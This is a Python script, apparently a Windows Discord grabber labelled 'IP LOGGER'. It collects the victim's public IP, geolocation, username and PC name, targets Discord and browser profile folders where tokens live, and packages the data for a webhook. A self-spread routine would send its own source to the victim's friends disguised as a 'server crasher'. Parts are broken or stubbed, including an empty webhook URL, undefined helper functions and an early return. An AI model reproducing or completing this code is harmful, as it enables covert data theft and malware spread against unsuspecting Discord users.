from tkinter import *
import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
from threading import Thread
from sys import argv
import numpy as np
import requests
from bs4 import BeautifulSoup
url = 'https://trouver-ip.com/'
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
reponse = requests.get(url)
soup = BeautifulSoup(reponse.text, "html.parser")
items = soup.findAll('tr')
pays = items[5]

reponse2 = requests.get(url)
soup2 = BeautifulSoup(reponse2.text, "html.parser")
items2 = soup2.findAll('tr')
region = items2[6]

reponse3 = requests.get(url)
soup3 = BeautifulSoup(reponse3.text, "html.parser")
items3 = soup3.findAll('tr')
ville = items3[7]

reponse4 = requests.get(url)
soup4 = BeautifulSoup(reponse4.text, "html.parser")
items4 = soup4.findAll('tr')
postal = items4[8]


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getip():
    ip = "Introuvable"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


def spread(token, form_data, delay):
    return 
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)
def discord():
    cache_path = ROAMING + "\\.cache~$"
    ip = getip()
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("ComputerName")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**IP LOGGER**",
                        "value": f'IP : {ip}\n\nUtilisateur : {pc_username}\n\nNom du PC : {pc_name}\n',
                        "inline": True
                    },
                    {
                        "name": "**LOCALISATION**",
                        "value": f'{pays.text}{region.text}{ville.text}{postal.text}', 
                        "inline": False
                    },
                ],
            }
    embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Duwa le plus fort",
        "avatar_url": "https://image.flaticon.com/icons/png/512/1451/1451451.png"
    }
    try:
        urlopen(Request("", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    discord()
except Exception as e:
    print(e)
    pass
    
